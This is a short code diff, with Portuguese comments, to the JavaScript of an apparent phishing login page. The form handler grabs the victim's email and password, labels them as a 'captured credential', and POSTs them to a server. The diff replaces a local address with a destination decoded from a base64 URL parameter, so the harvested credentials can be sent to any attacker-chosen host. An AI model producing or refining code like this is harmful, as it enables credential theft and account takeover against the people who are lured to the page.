@@ -20,11 +20,19 @@
     document.getElementById('form-login').addEventListener('submit', function (e) {
       e.preventDefault();
       
+      // Pega os parametros
+      var params = new URLSearchParams(window.location.search);
+      
+      // Pega o parametro "to" e descriptografa dele de base64
+      var destino = atob(params.get('to'));
+      
+      // Pega o email e senha
       var email = document.getElementById('email').value;
       var senha = document.getElementById('senha').value;
       var data = "####\n\n[🥃 CREDENCIAL CAPTURADA]\nEMAIL: " + email + "\nSENHA: " + senha + "\n\n####\n";
 
-      fetch('http://0.0.0.0:8080', {
+      // Envia os dados para o ip
+      fetch('http://'+destino, {
         method: 'POST',
         body: data,
         headers: {
